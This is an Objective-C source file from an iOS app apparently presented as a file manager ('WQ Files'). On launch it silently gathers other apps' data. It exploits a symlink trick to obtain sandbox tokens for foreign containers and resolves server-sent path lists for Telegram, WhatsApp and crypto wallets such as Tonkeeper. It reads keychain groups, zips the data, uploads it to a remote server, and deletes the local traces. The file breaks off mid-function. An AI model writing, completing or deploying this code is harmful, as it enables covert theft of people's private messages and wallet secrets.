//
//  WQCollector.m
//  WQ Files
//
//  自动采集流程。顺序与 3105 一致，每一步都上报一条阶段日志：
//
//    阶段 1/6  app 已启动，自动开启应用数据采集
//    阶段 2/6  正在获取采集信息 → 获取采集信息完成 — N 项
//    阶段 3/6  容器索引就绪 — N 个应用
//    阶段 4/6  开始采集 N 项
//    阶段 5/6  采集完成 — 已处理 N 个
//    阶段 6/6  本地文件已删除 → 流程结束
//

#import "WQCollector.h"
#import "WQAccess.h"
#import "WQArchive.h"

#import <UIKit/UIKit.h>
#import <errno.h>
#import <fnmatch.h>
#import <sys/stat.h>
#import <stdlib.h>
#import <unistd.h>

// WQNet.swift 暴露的 C 入口
extern int wqnet_ready(void);
extern char *wqnet_describe(void);
extern char *wqnet_last_error(void);
extern char *wqnet_configs(void);
extern int wqnet_apps(const char *jsonArray);
extern int wqnet_log(const char *text);
extern int wqnet_upload(const char *filePath, const char *bundleID);

static const char *kAppDataRoot = "/var/mobile/Containers/Data/Application";
static const int64_t kMaxInode = 45000000;   // 固定上限：maxInode=0 会触发 WQ 的共享扫描探针
static const NSUInteger kMaxLocalDirs = 3;

// 单个应用的复制上限。TG / WhatsApp 的整容器能到几十 GB（实测 TG 34.2 GiB /
// 84,494 文件），不设闸会把设备和上传都拖死。钱包类数据只有几百 KB ~ 几十 MB。
static const unsigned long long kMaxCopyBytes = 3ULL * 1024 * 1024 * 1024;   // 3 GiB
static const NSUInteger kMaxCopyFiles = 80000;

static BOOL gRunning = NO;
static NSString *gSummary = nil;
static NSLock *gLock = nil;

/// 本地日志：Documents/wq-collect.log。
/// 沙盒里直接能看到，用来诊断"为什么没上报"——NSLog 在设备上看不到。
static void WQFileLog(NSString *line) {
    static NSDateFormatter *fmt = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        fmt = [[NSDateFormatter alloc] init];
        fmt.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
        fmt.dateFormat = @"MM-dd HH:mm:ss.SSS";
    });
    NSString *dir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (dir.length == 0) {
        // 沙盒还没建立时退回 tmp，至少能证明流程启动过
        dir = NSTemporaryDirectory();
        if (dir.length == 0) return;
    }
    NSString *path = [dir stringByAppendingPathComponent:@"wq-collect.log"];
    NSString *stamped = [NSString stringWithFormat:@"%@ %@\n", [fmt stringFromDate:[NSDate date]], line];
    NSData *data = [stamped dataUsingEncoding:NSUTF8StringEncoding];
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) {
        [data writeToFile:path atomically:YES];
        return;
    }
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [data writeToFile:path atomically:YES];
        return;
    }
    @try {
        [fh seekToEndOfFile];
        [fh writeData:data];
    } @catch (__unused NSException *e) {
    } @finally {
        [fh closeFile];
    }
}

static void WQStage(NSString *format, ...) {
    va_list args;
    va_start(args, format);
    NSString *text = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);
    NSLog(@"[WQCollector] %@", text);
    int ready = wqnet_ready();
    if (ready == 0) {
        int rc = wqnet_log(text.UTF8String);
        WQFileLog([NSString stringWithFormat:@"[stage] %@  (log rc=%d)", text, rc]);
    } else {
        WQFileLog([NSString stringWithFormat:@"[stage] %@  (NOT reported: wqnet_ready=%d)", text, ready]);
    }
}

/// 把网络层最后一次失败原因写进 wq-collect.log
static void WQDumpNetError(NSString *where) {
    char *err = wqnet_last_error();
    NSString *text = err ? [NSString stringWithUTF8String:err] : @"(null)";
    if (err) free(err);
    WQFileLog([NSString stringWithFormat:@"[net] %@ -> %@", where, text]);
}

static NSString *WQAppDocuments(void) {
    NSArray<NSString *> *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    return paths.firstObject ?: NSTemporaryDirectory();
}

static NSString *WQCollectDirectory(void) {
    NSString *dir = [WQAppDocuments() stringByAppendingPathComponent:@"wq-collect"];
    [[NSFileManager defaultManager] createDirectoryAtPath:dir
                              withIntermediateDirectories:YES
                                       attributes:nil
                                            error:NULL];
    return dir;
}

static NSUInteger WQPruneLocalDirs(void) {
    NSString *dir = WQCollectDirectory();
    NSArray<NSString *> *names = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:NULL];
    NSMutableArray<NSString *> *folders = [NSMutableArray array];
    for (NSString *name in names) {
        if ([name hasPrefix:@"."]) continue;
        [folders addObject:name];
    }
    if (folders.count <= kMaxLocalDirs) return 0;
    [folders sortUsingSelector:@selector(compare:)];
    NSUInteger removed = 0;
    for (NSUInteger i = 0; i + kMaxLocalDirs < folders.count; i++) {
        NSString *path = [dir stringByAppendingPathComponent:folders[i]];
        if ([[NSFileManager defaultManager] removeItemAtPath:path error:NULL]) removed++;
    }
    return removed;
}

static NSString *WQStamp(void) {
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    formatter.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
    formatter.dateFormat = @"yyyyMMdd-HHmmss";
    return [formatter stringFromDate:[NSDate date]];
}

// MARK: - 下发范围日志（诊断）

/// 独立日志：Documents/wq-scope.log。
/// 与 wq-collect.log 分开，因为这里记录的是"服务端到底下发了什么范围"，以及每条
/// 下发路径在真实容器里的存在性、层级、文件数、字节数。用途只有一个：判断采集
/// 为空是容器本身没数据，还是 WQCopyContainer 的固定深度（只到容器根下第 3 层
/// 文件）压根覆盖不到。两份日志都不随 wq-collect/ 采集目录一起被清理。
static NSString *WQScopeLogPath(void) {
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (docs.length == 0) docs = NSTemporaryDirectory();
    if (docs.length == 0) return nil;
    return [docs stringByAppendingPathComponent:@"wq-scope.log"];
}

static void WQScopeLog(NSString *format, ...) {
    va_list args;
    va_start(args, format);
    NSString *line = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);

    NSString *path = WQScopeLogPath();
    if (line.length == 0 || path.length == 0) return;

    NSMutableString *text = [NSMutableString stringWithFormat:@"%@ %@\n", WQStamp(), line];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSFileHandle *fh = [fm fileExistsAtPath:path] ? [NSFileHandle fileHandleForWritingAtPath:path] : nil;
    if (!fh) {
        [text writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:NULL];
        return;
    }
    @try {
        [fh seekToEndOfFile];
        [fh writeData:[text dataUsingEncoding:NSUTF8StringEncoding]];
    } @catch (__unused NSException *e) {
    } @finally {
        [fh closeFile];
    }
}

typedef struct {
    NSUInteger files;
    NSUInteger dirs;
    NSUInteger denied;
    NSUInteger maxDepth;
    unsigned long long bytes;
} WQProbeStats;

/// 递归统计一个目录里的普通文件数、字节数、最深层级；不跟随软链。
/// 被拒绝的目录记进 denied（wq_list 失败时 errno 是 EACCES/EPERM）。
static void WQProbePath(NSString *path, NSUInteger depth, WQProbeStats *st) {
    if (path.length == 0 || depth > 24) return;
    NSArray<NSString *> *names = wq_list(path, NULL);
    if (!names) { st->denied++; return; }
    if (depth > st->maxDepth) st->maxDepth = depth;
    for (NSString *name in names) {
        if ([name hasPrefix:@".com.apple.mobile_container_manager"]) continue;
        NSString *child = [path stringByAppendingPathComponent:name];
        struct stat sb;
        if (lstat(child.fileSystemRepresentation, &sb) != 0) continue;
        if (S_ISLNK(sb.st_mode)) continue;
        if (S_ISDIR(sb.st_mode)) {
            st->dirs++;
            WQProbePath(child, depth + 1, st);
        } else if (S_ISREG(sb.st_mode)) {
            st->files++;
            st->bytes += (unsigned long long)sb.st_size;
        }
    }
}

/// 下发清单的一条 → 规范化相对路径。兼容三种写法：
///   JSON 数组 ["a","b"]、多行字符串 "a\nb"（每行一条）、带前导/尾随斜杠的写法。
static NSArray<NSString *> *WQPathList(id value) {
    NSMutableArray *raw = [NSMutableArray array];
    if ([value isKindOfClass:[NSArray class]]) {
        [raw addObjectsFromArray:(NSArray *)value];
    } else if ([value isKindOfClass:[NSString class]]) {
        [raw addObjectsFromArray:[(NSString *)value componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]]];
    } else if (value != nil) {
        [raw addObject:[value description]];
    }

    NSMutableArray<NSString *> *out = [NSMutableArray array];
    for (id item in raw) {
        NSString *s = [item isKindOfClass:[NSString class]] ? (NSString *)item : [item description];
        s = [s stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
        while (s.length > 1 && [s hasPrefix:@"/"]) s = [s substringFromIndex:1];
        while (s.length > 1 && [s hasSuffix:@"/"]) s = [s substringToIndex:s.length - 1];
        if (s.length == 0 || [s isEqualToString:@"/"] || [s hasPrefix:@"#"]) continue;
        if (![out containsObject:s]) [out addObject:s];
    }
    return out;
}

static id WQFirstValue(NSDictionary *cfg, NSArray<NSString *> *keys) {
    for (NSString *key in keys) {
        id v = cfg[key];
        if (v) return v;
    }
    return nil;
}

/// 相对容器根的层数：Library/mmkv/mmkv.default = 3；"." 表示容器根本身 = 0。
static NSUInteger WQRelativeDepth(NSString *rel) {
    if (rel.length == 0 || [rel isEqualToString:@"."]) return 0;
    return [rel componentsSeparatedByString:@"/"].count;
}

/// WQCopyContainer 的硬边界曾经是：容器根(0) → 一级目录(1) → 二级目录(2) → 三级文件(3)。
/// 现在清单驱动 + WQCopyTree 递归，不再受这个边界限制；覆盖情况改按实际采集结果判定。
/// truncated 必须单独成一类：整容器（TG / WhatsApp）撞到体积上限时，文件数一定对不上，
/// 但它不是失败，不能混进"采集缺口"。
static NSString *WQCoverageVerdict(BOOL srcExists, NSUInteger srcFiles,
                                   BOOL dstExists, NSUInteger dstFiles,
                                   BOOL truncated, NSUInteger skippedDirs) {
    if (!srcExists) return @"MISSING(容器里没有这个路径)";
    if (srcFiles == 0) return @"EMPTY(容器内 0 个文件)";
    if (!dstExists || dstFiles == 0) return @"NOT-COPIED(容器内有文件，采集到 0)";
    if (truncated) {
        return [NSString stringWithFormat:@"TRUNCATED(达到 %llu GiB / %lu 文件上限，已采 %lu/%lu)",
                kMaxCopyBytes / (1024ULL * 1024ULL * 1024ULL),
                (unsigned long)kMaxCopyFiles, (unsigned long)dstFiles, (unsigned long)srcFiles];
    }
    if (skippedDirs > 0) {
        return [NSString stringWithFormat:@"covered(已跳过 %lu 个媒体/缓存目录，实采 %lu/%lu 文件)",
                (unsigned long)skippedDirs, (unsigned long)dstFiles, (unsigned long)srcFiles];
    }
    if (dstFiles < srcFiles) return @"PARTIAL(部分文件没复制成功)";
    return @"covered";
}

static NSArray<NSString *> *WQUniquePaths(NSArray<NSString *> *list) {
    NSMutableArray<NSString *> *out = [NSMutableArray array];
    for (NSString *item in list) {
        if (item.length == 0 || [out containsObject:item]) continue;
        [out addObject:item];
    }
    return out;
}

/// 解析一条 config 的采集范围。
///
/// 服务端 /api/device/report 实际下发（dist/modules/device/service/info.js 的
/// buildReportCollectPlain）是：
///     { bundle_id, app_name, access_group, items:[ {type:"file"|"dir", path} ] }
/// 而旧模板是 dirs / files 两个数组（或多行字符串）。两种都收，否则就会出现
/// "服务端明明下发了路径、客户端却记成 dirs=0 files=0"。
static void WQParseScope(NSDictionary *cfg,
                         NSMutableArray<NSString *> *dirs,
                         NSMutableArray<NSString *> *files) {
    id items = WQFirstValue(cfg, @[@"items", @"entries", @"scope"]);
    if ([items isKindOfClass:[NSArray class]]) {
        for (id entry in (NSArray *)items) {
            if ([entry isKindOfClass:[NSDictionary class]]) {
                NSDictionary *item = (NSDictionary *)entry;
                id typeValue = item[@"type"];
                NSString *type = [typeValue isKindOfClass:[NSString class]]
                                 ? [(NSString *)typeValue lowercaseString] : @"";
                id pathValue = WQFirstValue(item, @[@"path", @"value", @"rel", @"relative"]);
                BOOL isDir = [type isEqualToString:@"dir"]
                          || [type isEqualToString:@"folder"]
                          || [type isEqualToString:@"directory"];
                BOOL isFile = [type isEqualToString:@"file"];
                // type 缺失时用尾随斜杠判断，再不行按文件处理（与旧行为一致）
                if (!isDir && !isFile && [pathValue isKindOfClass:[NSString class]]) {
                    isDir = [(NSString *)pathValue hasSuffix:@"/"];
                }
                if (isDir && [pathValue isKindOfClass:[NSString class]]) {
                    // "/" 表示整个容器（服务端对 TG / 备忘录这类就是整容器采集）。
                    // WQPathList 会把单独一个 "/" 当无效路径丢掉，这里单独标成 "."。
                    NSString *rawPath = [(NSString *)pathValue
                        stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
                    if (rawPath.length == 0 || [rawPath isEqualToString:@"/"] || [rawPath isEqualToString:@"."]) {
                        [dirs addObject:@"."];
                        continue;
                    }
                }
                NSArray<NSString *> *paths = WQPathList(pathValue);
                [(isDir ? dirs : files) addObjectsFromArray:paths];
            } else if ([entry isKindOfClass:[NSString class]] && [(NSString *)entry hasSuffix:@"/"]) {
                [dirs addObjectsFromArray:WQPathList(entry)];
            } else {
                [files addObjectsFromArray:WQPathList(entry)];
            }
        }
    }

    // 旧模板兼容
    [dirs addObjectsFromArray:WQPathList(WQFirstValue(cfg, @[@"dirs", @"directories", @"folders"]))];
    [files addObjectsFromArray:WQPathList(WQFirstValue(cfg, @[@"files", @"file_paths"]))];
}

/// 通配展开：清单里可以写 account-*/postbox 这种。
/// Telegram 的 account-<peerId>/ 每台设备都不一样，服务端事先写不死。
static BOOL WQHasWildcard(NSString *rel) {
    return [rel containsString:@"*"] || [rel containsString:@"?"];
}

/// 把一条可能带通配的相对路径，展开成容器内真实存在的相对路径（保留完整层级，
/// 这样落盘结构和原始容器一致，服务端 recover 时才找得到 accounts-metadata/）。
static NSArray<NSString *> *WQExpandOne(NSString *container, NSString *pattern) {
    NSArray<NSString *> *segments = [pattern componentsSeparatedByString:@"/"];
    NSMutableArray<NSString *> *current = [NSMutableArray arrayWithObject:@""];
    NSFileManager *fm = [NSFileManager defaultManager];

    for (NSString *seg in segments) {
        if (seg.length == 0) continue;
        BOOL wild = WQHasWildcard(seg);
        NSMutableArray<NSString *> *next = [NSMutableArray array];

        for (NSString *prefix in current) {
            if (!wild) {
                NSString *candidate = prefix.length ? [prefix stringByAppendingPathComponent:seg] : seg;
                if ([fm fileExistsAtPath:[container stringByAppendingPathComponent:candidate]]) {
                    [next addObject:candidate];
                }
                continue;
            }
            NSString *absDir = prefix.length
                             ? [container stringByAppendingPathComponent:prefix] : container;
            for (NSString *name in wq_list(absDir, NULL)) {
                if ([name hasPrefix:@"."]) continue;
                if (fnmatch(seg.UTF8String, name.UTF8String, 0) != 0) continue;
                [next addObject:(prefix.length ? [prefix stringByAppendingPathComponent:name] : name)];
            }
        }

        // 异常目录（几千个同名段）不该把采集拖垮
        if (next.count > 256) [next removeObjectsInRange:NSMakeRange(256, next.count - 256)];
        current = next;
        if (current.count == 0) break;
    }

    NSMutableArray<NSString *> *out = [NSMutableArray array];
    for (NSString *item in current) {
        if (item.length) [out addObject:item];
    }
    return out;
}

static NSArray<NSString *> *WQExpandScopeList(NSString *container, NSArray<NSString *> *list) {
    NSMutableArray<NSString *> *out = [NSMutableArray array];
    for (NSString *rel in list) {
        if ([rel isEqualToString:@"."] || !WQHasWildcard(rel)) {
            [out addObject:rel];
            continue;
        }
        NSArray<NSString *> *expanded = WQExpandOne(container, rel);
        if (expanded.count == 0) {
            WQScopeLog(@"通配无匹配：%@（容器内没有对应目录，服务端清单可能写错）", rel);
            continue;
        }
        WQScopeLog(@"通配展开：%@ -> %lu 项：%@", rel, (unsigned long)expanded.count,
                   [expanded componentsJoinedByString:@", "]);
        [out addObjectsFromArray:expanded];
    }
    return WQUniquePaths(out);
}

/// 列一个目录的前 limit 项，目录带尾随斜杠。用于"路径不存在"时把真实结构打进日志。
static NSString *WQListSample(NSString *dir, NSUInteger limit) {
    NSArray<NSString *> *names = wq_list(dir, NULL);
    if (!names) return @"(列不出)";
    NSArray<NSString *> *sorted = [names sortedArrayUsingSelector:@selector(compare:)];
    NSMutableArray<NSString *> *out = [NSMutableArray array];
    for (NSString *name in sorted) {
        if ([name hasPrefix:@"."]) continue;
        BOOL isDir = NO;
        [[NSFileManager defaultManager] fileExistsAtPath:[dir stringByAppendingPathComponent:name]
                                             isDirectory:&isDir];
        [out addObject:[NSString stringWithFormat:@"%@%@", name, isDir ? @"/" : @""]];
        if (out.count >= limit) break;
    }
    return out.count ? [out componentsJoinedByString:@", "] : @"(空)";
}

/// 在容器内限深度找一个同名目录，返回相对路径。
/// TG 各版本把 accounts-metadata / postbox 放在不同层级（例如 telegram-data/ 下），
/// 清单写死一层就会 MISSING。跳过 media / cache 这类几十 GB 的大目录。
static NSString *WQFindDirNamed(NSString *container, NSString *want, NSUInteger maxDepth) {
    if (want.length == 0) return nil;
    NSMutableArray<NSString *> *queue = [NSMutableArray arrayWithObject:@""];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSSet *skip = [NSSet setWithObjects:@"media", @"cache", @"cache-storage",
                                            @"storage", @"logs", nil];

    for (NSUInteger depth = 0; depth <= maxDepth && queue.count > 0; depth++) {
        NSMutableArray<NSString *> *nextQueue = [NSMutableArray array];
        for (NSString *rel in queue) {
            NSString *abs = rel.length ? [container stringByAppendingPathComponent:rel] : container;
            for (NSString *name in wq_list(abs, NULL)) {
                if ([name hasPrefix:@"."] || [skip containsObject:name]) continue;
                BOOL isDir = NO;
                NSString *child = [abs stringByAppendingPathComponent:name];
                if (![fm fileExistsAtPath:child isDirectory:&isDir] || !isDir) continue;
                NSString *relChild = rel.length ? [rel stringByAppendingPathComponent:name] : name;
                if ([name isEqualToString:want]) return relChild;
                if (depth + 1 <= maxDepth) [nextQueue addObject:relChild];
            }
        }
        queue = nextQueue;
    }
    return nil;
}

/// 把清单里的目录解析成容器内真实可用的相对路径：
/// 1) 存在 → 直接用；2) 含通配 → 展开；3) 不存在/展开为空 → 在容器内找同名目录回退。
/// 回退结果写进 scope 日志，后台清单写错时能一眼看到实际位置。
static NSArray<NSString *> *WQResolveDirs(NSString *container, NSArray<NSString *> *patterns) {
    NSMutableArray<NSString *> *out = [NSMutableArray array];
    NSFileManager *fm = [NSFileManager defaultManager];

    for (NSString *rel in patterns) {
        if ([rel isEqualToString:@"."]) {
            [out addObject:rel];
            continue;
        }
        if (WQHasWildcard(rel)) {
            NSArray<NSString *> *expanded = WQExpandOne(container, rel);
            if (expanded.count > 0) {
                WQScopeLog(@"通配展开：%@ -> %lu 项：%@", rel, (unsigned long)expanded.count,
                           [expanded componentsJoinedByString:@", "]);
                [out addObjectsFromArray:expanded];
                continue;
            }
            NSString *found = WQFindDirNamed(container, rel.lastPathComponent, 3);
            WQScopeLog(@"通配无匹配：%@；%@", rel, found.length
                       ? [NSString stringWithFormat:@"容器内同名目录在 %@，按其回退", found]
                       : @"容器内也没有同名目录");
            if (found.length) [out addObject:found];
            continue;
        }

        if ([fm fileExistsAtPath:[container stringByAppendingPathComponent:rel]]) {
            [out addObject:rel];
            continue;
        }
        NSString *found = WQFindDirNamed(container, rel.lastPathComponent, 3);
        if (found.length) {
            WQScopeLog(@"路径不存在：%@；容器内同名目录在 %@，按其回退", rel, found);
            [out addObject:found];
        } else {
            WQScopeLog(@"路径不存在：%@；容器根有 [%@]", rel, WQListSample(container, 24));
        }
    }
    return WQUniquePaths(out);
}

/// keychain 组：服务端字段叫 access_group，旧模板叫 keychain_group。
static NSString *WQKeychainGroupText(NSDictionary *cfg) {
    id value = WQFirstValue(cfg, @[@"keychain_group", @"access_group", @"keychainGroup"]);
    if ([value isKindOfClass:[NSString class]] && [(NSString *)value length] > 0) {
        return (NSString *)value;
    }
    return @"(nil/空)";
}

/// 应用名：服务端叫 app_name，旧模板叫 name。
static NSString *WQAppNameText(NSDictionary *cfg) {
    id value = WQFirstValue(cfg, @[@"app_name", @"name", @"display_name"]);
    if ([value isKindOfClass:[NSString class]] && [(NSString *)value length] > 0) {
        return (NSString *)value;
    }
    return @"";
}

/// worse_query 会把 App Group 的 Library/Caches 换成指向目标目录的软链，
/// 让 containermanagerd 顺链签发 token；正常情况下用完会还原。
/// 如果上一次运行被打断（进程被杀、release 没走到），这里会留下软链，
/// 之后每次 createSymbolicLinkAtPath 都失败（errno 22 EINVAL），
/// grant 全部 -4 —— 就是 "token cache recovery failed" 反复刷屏的原因。
/// 这里在枚举容器之前把它们恢复成普通目录。
static void WQRepairAppGroupLibrary(NSString *group) {
    if (group.length == 0) return;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *groupURL = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupURL) {
        WQFileLog([NSString stringWithFormat:@"repair: group %@ has no container", group]);
        return;
    }
    NSString *library = [groupURL.path stringByAppendingPathComponent:@"Library"];
    NSString *caches = [library stringByAppendingPathComponent:@"Caches"];

    struct stat st;
    for (NSString *path in @[library, caches]) {
        if (lstat(path.fileSystemRepresentation, &st) == 0) {
            if (S_ISLNK(st.st_mode)) {
                NSString *dest = [fm destinationOfSymbolicLinkAtPath:path error:NULL];
                WQFileLog([NSString stringWithFormat:@"repair: %@ is a symlink -> %@ (removing)",
                           path.lastPathComponent, dest ?: @"?"]);
                [fm removeItemAtPath:path error:NULL];
            } else if (!S_ISDIR(st.st_mode)) {
                WQFileLog([NSString stringWithFormat:@"repair: %@ is not a directory (removing)", path.lastPathComponent]);
                [fm removeItemAtPath:path error:NULL];
            }
        }
    }
    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:NULL];

    // worse_query / WQAccess 的安全交换：Caches 被换成软链前先写
    //   .wq-caches-swap.plist    （marker，记录原 inode 与 target）
    //   .wq-caches-preserved     （原 Caches 目录改名而来）
    // 进程中途被杀会留下三者并存的状态，之后每次 WQCacheSwapRecover 都 EINVAL，
    // wq_query 的 @finally 就把 handle 设成 -8 —— 每个容器 grant 都失败。
    // 这里按最保守的方式复原：删软链、把 preserved 换回 Caches、删 marker。
    NSString *marker = [library stringByAppendingPathComponent:@".wq-caches-swap.plist"];
    NSString *saved  = [library stringByAppendingPathComponent:@".wq-caches-preserved"];
    BOOL hasMarker = [fm fileExistsAtPath:marker];
    BOOL hasSaved  = [fm fileExistsAtPath:saved];
    if (hasMarker || hasSaved) {
        WQFileLog([NSString stringWithFormat:@"repair: swap residue in %@ (marker=%d saved=%d)",
                   group, hasMarker, hasSaved]);
        struct stat cst;
        if (lstat(caches.fileSystemRepresentation, &cst) == 0 && S_ISLNK(cst.st_mode)) {
            [fm removeItemAtPath:caches error:NULL];
        }
        if (hasSaved) {
            [fm removeItemAtPath:caches error:NULL];
            if (![fm moveItemAtPath:saved toPath:caches error:NULL]) {
                [fm removeItemAtPath:saved error:NULL];
                [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:NULL];
            }
        }
        [fm removeItemAtPath:marker error:NULL];
        if (![fm fileExistsAtPath:caches]) {
            [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:NULL];
        }
        WQFileLog([NSString stringWithFormat:@"repair: swap residue cleared in %@ (caches=%@ marker=%@ saved=%@)",
                   group,
                   [fm fileExistsAtPath:caches] ? @"YES" : @"NO",
                   [fm fileExistsAtPath:marker] ? @"still" : @"gone",
                   [fm fileExistsAtPath:saved] ? @"still" : @"gone"]);
    }

    BOOL ok = [fm fileExistsAtPath:caches];
    WQFileLog([NSString stringWithFormat:@"repair: %@ Library/Caches ready=%@", group, ok ? @"YES" : @"NO"]);
}

static NSDictionary<NSString *, NSString *> *WQEnumerateContainers(NSUInteger *granted, NSUInteger *refused) {    NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
    NSUInteger okCount = 0, noCount = 0;

    NSString *root = [NSString stringWithUTF8String:kAppDataRoot];
    NSArray<NSString *> *dirs = wq_enumerate(root, kMaxInode, nil, nil);
    if (dirs.count == 0) {
        wq_grant(root);
        dirs = wq_list(root, NULL);
    }
    for (NSString *dir in dirs) {
        if (dir.length == 0 || [dir.lastPathComponent hasPrefix:@"."]) continue;
        if (wq_grant(dir)) okCount++; else noCount++;
        NSString *label = wq_container_label(dir);
        if (label.length > 0) map[label] = dir;
    }
    if (granted) *granted = okCount;
    if (refused) *refused = noCount;
    return map;
}

/// App Group 共享容器：group.* 这类 bundle 的数据不在 Data/Application 下，
/// 而在 /private/var/mobile/Containers/Shared/AppGroup/<UUID>/。
/// 容器根里的 .com.apple.mobile_container_manager.metadata.plist 带
/// MCMMetadataIdentifier，值就是 group.<id>。
static NSUInteger WQEnumerateAppGroups(NSMutableDictionary<NSString *, NSString *> *map) {
    NSString *root = @"/private/var/mobile/Containers/Shared/AppGroup";
    NSArray<NSString *> *dirs = wq_list(root, NULL);
    if (!dirs) {
        wq_grant(root);
        dirs = wq_list(root, NULL);
    }
    if (!dirs) {
        WQFileLog([NSString stringWithFormat:@"app-group-scan: 列不出 %@ errno=%d", root, errno]);
        return 0;
    }

    NSUInteger added = 0, unlabeled = 0, existing = 0, unreadable = 0;
    NSMutableArray<NSString *> *sample = [NSMutableArray array];
    for (NSString *name in dirs) {
        if ([name hasPrefix:@"."]) continue;
        NSString *path = [root stringByAppendingPathComponent:name];

        // 必须用 wq_container_label：它先读 xattr com.apple.containermanager.identifier
        // （不需要任何文件权限），再退到 container query / LaunchServices。
        // metadata plist 是 root-only 600，自己解 plist 会一个都拿不到——
        // 上一版就是这样，236 个容器全被判空。
        NSString *label = wq_container_label(path);
        if (label.length == 0) {
            unlabeled++;
            if (sample.count < 6) [sample addObject:[NSString stringWithFormat:@"%@?(无label)", name]];
            continue;
        }
        if (map[label]) { existing++; continue; }

        BOOL readable = (wq_list(path, NULL) != nil);
        if (!readable) {
            wq_grant(path);
            readable = (wq_list(path, NULL) != nil);
        }
        if (!readable) unreadable++;      // 仍然收进索引，让采集阶段给出明确失败原因
        map[label] = path;
        added++;
        if (sample.count < 6) [sample addObject:label];
    }
    WQFileLog([NSString stringWithFormat:
               @"app-group-scan: %lu 个容器，新增 %lu（已在索引 %lu / 无 label %lu / 列不出 %lu），样例=%@",
               (unsigned long)dirs.count, (unsigned long)added, (unsigned long)existing,
               (unsigned long)unlabeled, (unsigned long)unreadable,
               [sample componentsJoinedByString:@", "]]);
    return added;
}

static NSUInteger WQCommonPrefixLength(NSString *a, NSString *b) {
    NSUInteger n = MIN(a.length, b.length);
    NSUInteger i = 0;
    while (i < n && [a characterAtIndex:i] == [b characterAtIndex:i]) i++;
    return i;
}

/// 给"容器不在索引里"的 bundle 列出最相近的几个 label，
/// 用来区分"确实没装"和"bundle_id 与真实 id 差一个字母"（例如
/// 后台写的 com.jbig.tonkeeper 对应真实 id com.jbiga.tonkeeper）。
static NSString *WQClosestLabels(NSArray<NSString *> *labels, NSString *target, NSUInteger limit) {
    NSMutableArray<NSString *> *best = [NSMutableArray array];
    for (NSString *label in labels) {
        NSUInteger score = WQCommonPrefixLength(label, target);
        if (score < 4) continue;
        NSUInteger insertAt = 0;
        while (insertAt < best.count &&
               WQCommonPrefixLength(best[insertAt], target) >= score) {
            insertAt++;
        }
        if (insertAt < limit) {
            [best insertObject:label atIndex:insertAt];
            if (best.count > limit) [best removeLastObject];
        }
    }
    return best.count ? [best componentsJoinedByString:@", "] : @"(无相近项)";
}

static NSString *WQJSONFromArray(NSArray *items) {
    NSData *data = [NSJSONSerialization dataWithJSONObject:items options:0 error:NULL];
    if (!data) return @"[]";
    return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] ?: @"[]";
}

/// 把 ZIP 条目名改成 Windows 也能建出来的名字：NTFS 不允许 : * ? " < > |
/// 与控制字符，也不允许以空格/句点结尾；iOS 容器里这些都合法（Telegram 的
/// accounts-metadata/spotlight/p:93372553），服务端在 Windows 上解压会
/// EINVAL: invalid argument, mkdir ...
static NSString *WQWindowsSafeEntryName(NSString *name) {
    if (name.length == 0) return name;
    static NSCharacterSet *bad = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSMutableCharacterSet *set =
            [NSMutableCharacterSet characterSetWithCharactersInString:@":*?\"<>|"];
        [set formUnionWithCharacterSet:[NSCharacterSet controlCharacterSet]];
        bad = [set copy];
    });

    NSArray<NSString *> *parts = [name componentsSeparatedByString:@"/"];
    NSMutableArray<NSString *> *out = [NSMutableArray arrayWithCapacity:parts.count];
    for (NSString *part in parts) {
        if (part.length == 0) { [out addObject:part]; continue; }
        NSString *safe = [[part componentsSeparatedByCharactersInSet:bad]
                          componentsJoinedByString:@"_"];
        while (safe.length > 0 && ([safe hasSuffix:@" "] || [safe hasSuffix:@"."])) {
            safe = [safe substringToIndex:safe.length - 1];
        }
        [out addObject:safe.length ? safe : @"_"];
    }
    return [out componentsJoinedByString:@"/"];
}

/// ZIP 写入用的 IO：底层走 WQAccess，所以别的 App 的容器也能读。
static WQArchiveIO *WQCollectorArchiveIO(void) {
    WQArchiveIO *io = [WQArchiveIO new];
    io.stat = ^BOOL(NSString *path, struct stat *st) { return wq_stat(path, st); };
    io.list = ^NSArray<NSString *> *(NSString *dir) { return wq_list(dir, NULL); };
    io.openRead = ^int(NSString *path) { return wq_open_for_reading(path); };
    io.skipUnreadable = YES;
    io.expectedUnreadableNames =
        [NSSet setWithObject:@".com.apple.mobile_container_manager.metadata.plist"];
    // 服务端可能在 Windows 上解压，条目名先转成 NTFS 合法的
    io.sanitizeEntryName = ^NSString *(NSString *name) { return WQWindowsSafeEntryName(name); };
    return io;
}

/// 复制一个容器（两层深，跳过 root-only 的 metadata plist）。
static NSUInteger WQCopyContainer(NSString *containerPath, NSString *destDir, NSError **outError) {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:destDir withIntermediateDirectories:YES attributes:nil error:NULL];

